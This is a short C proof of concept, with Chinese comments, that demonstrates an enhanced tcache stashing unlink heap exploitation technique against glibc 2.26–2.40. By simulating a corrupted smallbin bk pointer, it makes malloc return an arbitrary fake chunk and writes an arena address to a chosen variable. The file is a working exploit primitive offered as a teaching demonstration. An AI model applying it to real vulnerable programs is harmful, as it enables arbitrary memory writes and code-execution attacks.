/*
 * 手法：二次增强版 tcache 暂存解链攻击（TSU++）。
 * 适用：glibc 2.26～2.40。
 *
 * 漏洞模型：能修改 smallbin victim->bk。
 * 同一次 stashing 同时得到：
 *   1. 任意地址 fake_chunk 被挂进 tcache，随后 malloc 返回；
 *   2. fake_chunk->bk->fd = bin，把 main_arena/smallbin 地址写到 secret。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    __attribute__((aligned(16))) size_t fake_chunk[4] = {0};
    volatile size_t gap[0x50] = {0}; /* 避免 fake_chunk 与 secret 偶然重叠 */
    size_t secret = 0;
    size_t *chunks[12];
    size_t *result;

    setbuf(stdout, NULL);
    (void)gap;

    /* 7 个填 tcache；另外 5 个由 guard 隔开，释放后分别进 unsorted。 */
    for (int i = 0; i < 7; ++i)
        chunks[i] = malloc(0x100);
    for (int i = 0; i < 5; ++i) {
        chunks[7 + i] = malloc(0x100);
        (void)malloc(0x10);
    }

    for (int i = 0; i < 12; ++i)
        free(chunks[i]);

    /* tcache 从 7 减到 2；大请求把 5 个 unsorted chunk 排入 smallbin。
     * 随后的 calloc 会返回一个并继续 stash，容量刚好允许遍历到伪节点。
     */
    for (int i = 0; i < 5; ++i)
        (void)malloc(0x100);
    (void)malloc(0x200);

    /* 漏洞模拟：真实 victim 的 bk 指向 fake header。
     * fake header 的 bk 字段位于 fake_chunk 用户区 +8，令其指向
     * secret-0x10；循环执行 bck->fd = bin 时，fd 正好落在 secret。
     */
    chunks[11][1] = (size_t)fake_chunk - 0x10;
    fake_chunk[1] = (size_t)&secret - 0x10;

    (void)calloc(1, 0x100);
    result = malloc(0x100);

    printf("[+] TSU++：结果=%p，伪块=%p，值=%#zx\n",
           (void *)result, (void *)fake_chunk, secret);
    assert(result == fake_chunk);
    assert(secret != 0);              /* 此处应为 main_arena/smallbin 地址 */
    return 0;
}
